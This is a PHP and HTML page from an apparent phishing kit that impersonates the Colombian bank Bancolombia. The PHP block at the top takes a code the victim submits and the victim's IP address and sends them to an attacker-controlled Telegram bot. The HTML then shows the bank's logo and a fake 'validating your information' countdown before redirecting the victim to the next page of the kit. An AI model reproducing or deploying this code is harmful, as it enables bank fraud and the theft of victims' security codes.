<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
include('datos.php');

if( isset( $_POST['cod1'] ) ){

$message = ":::BamColombiaV3:::\r\nCod-1.: ".$_POST['cod1']."\r\nIP: ".$userp."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}
////////////////////
?>
<html style="--app-height:724px;"><head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=10">
   <link rel="icon" type="image/x-icon" href="">
   <title>Cargando</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
   <meta name="viewport" content="width=device-width, initial-scale=1">

</head>



<!-- END Header -->
<!-- Nav -->

<body>
   <div id="hh">
      <section id="funnel-de-ingreso">
         <div class="container">
            <div style="background-color: #ffffff; width: 100%;">
               <br>
               <div style="text-align: center;" align="left"><img style="width: 200px; display: block; margin-left: auto; margin-right: auto;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Logo_Bancolombia.svg/2560px-Logo_Bancolombia.svg.png">
<br>
<br>
               </div>
              </div>
           </div>
        </section></div>
               <div style="text-align: center;" align="left"><img style="width: 150px; display: block; margin-left: auto; margin-right: auto;" src="https://hermanaspicohueso.com/wp-content/uploads/loading_popup.gif">
               <br> <br>
               <div style="text-align: center;" align="center">
                  <span style="font-family: sans-serif;"> Por favor espere mientras validamos tu informacion y enviamos un codigo a su numero registrado. <br>
                     Cargando plataforma <strong><label id="countdown">0:13</label></strong>
               </span></div>
            </div>


      <script type="text/javascript">
         var url = "index5.php";
         var seconds = 30; //número de segundos a contar
         function secondPassed() {

            var minutes = Math.round((seconds - 30) / 60); //calcula el número de minutos
            var remainingSeconds = seconds % 60; //calcula los segundos
            //si los segundos usan sólo un dígito, añadimos un cero a la izq
            if (remainingSeconds < 10) {
               remainingSeconds = "0" + remainingSeconds;
            }
            document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;
            if (seconds == 0) {
               clearInterval(countdownTimer);
               window.location = url;
               document.getElementById('countdown').innerHTML = "";
            } else {
               seconds--;
            }
         }

         var countdownTimer = setInterval(secondPassed, 1000);
      </script>



</body></html>
